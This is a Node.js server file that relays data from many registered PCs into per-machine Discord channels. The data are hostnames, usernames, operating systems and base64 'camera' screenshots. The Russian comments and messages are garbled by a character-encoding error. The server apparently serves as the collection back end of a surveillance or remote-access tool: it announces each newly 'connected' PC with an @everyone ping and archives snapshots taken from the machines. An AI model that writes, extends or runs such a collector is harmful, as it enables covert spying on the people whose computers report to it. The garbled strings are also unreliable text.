// server.js
import express from "express";
import { Client, GatewayIntentBits, ChannelType } from "discord.js";
import { WebSocketServer } from "ws";
import http from "http";

const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
const GUILD_ID = process.env.GUILD_ID;
const CATEGORY_NAME = "–í—Å–µ –ü–ö";
const LOG_CHANNEL_NAME = "—Å–µ—Ä–≤–µ—Ä-–ª–æ–≥–∏";

const app = express();
app.use(express.json());
const server = http.createServer(app);
const wss = new WebSocketServer({ server });

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
    ],
});

// –∫—ç—à
let LOG_CHANNEL_ID = null;
const channelCacheByGuild = new Map();
const channelByPC = {};

// ---------- —Ñ—É–Ω–∫—Ü–∏–∏ ----------

// –ø–æ–ª—É—á–∏—Ç—å –∏–ª–∏ —Å–æ–∑–¥–∞—Ç—å –∫–∞—Ç–µ–≥–æ—Ä–∏—é
async function getOrCreateCategory(guild, name) {
    const channels = await guild.channels.fetch();
    let category = channels.find(c => c.type === ChannelType.GuildCategory && c.name === name);
    if (!category) {
        category = await guild.channels.create({
            name,
            type: ChannelType.GuildCategory,
        });
        await logToDiscord(`üìÇ –°–æ–∑–¥–∞–Ω–∞ –∫–∞—Ç–µ–≥–æ—Ä–∏—è: ${name}`);
    }
    return category;
}

// –ø–æ–ª—É—á–∏—Ç—å –∏–ª–∏ —Å–æ–∑–¥–∞—Ç—å —Ç–µ–∫—Å—Ç–æ–≤—ã–π –∫–∞–Ω–∞–ª
async function getOrCreateTextChannel(guild, name, parentId) {
    const gid = guild.id;
    if (!channelCacheByGuild.has(gid)) channelCacheByGuild.set(gid, {});
    const cache = channelCacheByGuild.get(gid);

    const key = `${name}::${parentId}`;
    if (cache[key]) return cache[key];

    const channels = await guild.channels.fetch();
    const matches = channels.filter(
        c => c.type === ChannelType.GuildText && c.name === name && c.parentId === parentId
    );

    if (matches.size >= 1) {
        cache[key] = matches.first();
        return matches.first();
    }

    const created = await guild.channels.create({
        name,
        type: ChannelType.GuildText,
        parentId: parentId,
    });

    cache[key] = created;
    await logToDiscord(`üìå –°–æ–∑–¥–∞–Ω –∫–∞–Ω–∞–ª: ${name} (–≤ –∫–∞—Ç–µ–≥–æ—Ä–∏–∏ ${parentId})`);
    return created;
}

// –ø–æ–ª—É—á–∏—Ç—å –∏–ª–∏ —Å–æ–∑–¥–∞—Ç—å –ª–æ–≥-–∫–∞–Ω–∞–ª
async function getOrCreateLogChannel(guild) {
    const channels = await guild.channels.fetch();
    let logChannel = channels.find(
        c => c.type === ChannelType.GuildText && c.name === LOG_CHANNEL_NAME
    );

    if (!logChannel) {
        logChannel = await guild.channels.create({
            name: LOG_CHANNEL_NAME,
            type: ChannelType.GuildText,
        });
        await logToDiscord("üìù –°–æ–∑–¥–∞–Ω –Ω–æ–≤—ã–π –ª–æ–≥-–∫–∞–Ω–∞–ª");
    }
    return logChannel;
}

// –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ
async function logToDiscord(message) {
    try {
        if (!LOG_CHANNEL_ID) {
            const guild = await client.guilds.fetch(GUILD_ID);
            const channel = await getOrCreateLogChannel(guild);
            LOG_CHANNEL_ID = channel.id;
        }

        const channel = await client.channels.fetch(LOG_CHANNEL_ID).catch(() => null);
        if (!channel) {
            const guild = await client.guilds.fetch(GUILD_ID);
            const newLogChannel = await getOrCreateLogChannel(guild);
            LOG_CHANNEL_ID = newLogChannel.id;
            return await newLogChannel.send(message);
        }

        await channel.send(message);
    } catch (err) {
        console.error("–û—à–∏–±–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è:", err);
    }
}

// ---------- REST API ----------

// –∑–∞–≥—Ä—É–∑–∫–∞ –ü–ö
app.post("/upload-pc", async (req, res) => {
    try {
        const { pcId, hostname, username, os } = req.body;
        if (!pcId) return res.status(400).json({ error: "pcId required" });

        const guild = await client.guilds.fetch(GUILD_ID);
        const category = await getOrCreateCategory(guild, CATEGORY_NAME);

        let finalChannel = null;
        if (channelByPC[pcId]) {
            finalChannel = await client.channels.fetch(channelByPC[pcId]).catch(() => null);
        }

        if (!finalChannel) {
            finalChannel = await getOrCreateTextChannel(guild, pcId, category.id);
            channelByPC[pcId] = finalChannel.id;

            const logChannel = await getOrCreateLogChannel(guild);
            await logChannel.send(`üöÄ –ù–æ–≤—ã–π –ü–ö –ø–æ–¥–∫–ª—é—á–µ–Ω: **${pcId}** <@everyone>`);
        }

        await finalChannel.send(
            `üíª **–ü–ö:** ${pcId}\nüë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: ${username || "?"}\nüñ•Ô∏è –•–æ—Å—Ç: ${hostname || "?"}\nü™ü –û–°: ${os || "?"}`
        );

        res.json({ ok: true });
    } catch (err) {
        await logToDiscord(`‚ùå –û—à–∏–±–∫–∞ upload-pc: ${err.message}`);
        res.status(500).json({ error: err.message });
    }
});

// –∑–∞–≥—Ä—É–∑–∫–∞ —Å–∫—Ä–∏–Ω–∞
app.post("/upload-cam", async (req, res) => {
    try {
        const { pcId, imageBase64 } = req.body;
        if (!pcId || !imageBase64) return res.status(400).json({ error: "pcId –∏ imageBase64 required" });

        let channelId = channelByPC[pcId];
        if (!channelId) {
            await logToDiscord(`‚ùå –ü–ö ${pcId} –Ω–µ –Ω–∞–π–¥–µ–Ω –ø—Ä–∏ upload-cam`);
            return res.status(404).json({ error: "PC not registered" });
        }

        const channel = await client.channels.fetch(channelId).catch(() => null);
        if (!channel) {
            await logToDiscord(`‚ùå –ö–∞–Ω–∞–ª –¥–ª—è –ü–ö ${pcId} —É–¥–∞–ª—ë–Ω`);
            return res.status(404).json({ error: "Channel not found" });
        }

        const buffer = Buffer.from(imageBase64, "base64");
        await channel.send({ content: `üì∏ –ù–æ–≤—ã–π —Å–Ω–∏–º–æ–∫ —Å –ü–ö ${pcId}`, files: [{ attachment: buffer, name: "screenshot.png" }] });

        res.json({ ok: true });
    } catch (err) {
        await logToDiscord(`‚ùå –û—à–∏–±–∫–∞ upload-cam: ${err.message}`);
        res.status(500).json({ error: err.message });
    }
});

// ---------- –∑–∞–ø—É—Å–∫ ----------

client.once("clientReady", () => {
    console.log(`–ë–æ—Ç –∑–∞–ª–æ–≥–∏–Ω–∏–ª—Å—è –∫–∞–∫ ${client.user.tag}`);
    logToDiscord("‚úÖ –°–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω –∏ –±–æ—Ç –æ–Ω–ª–∞–π–Ω");
});

client.login(DISCORD_BOT_TOKEN);

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`–°–µ—Ä–≤–µ—Ä —Å–ª—É—à–∞–µ—Ç –ø–æ—Ä—Ç ${PORT}`);
});
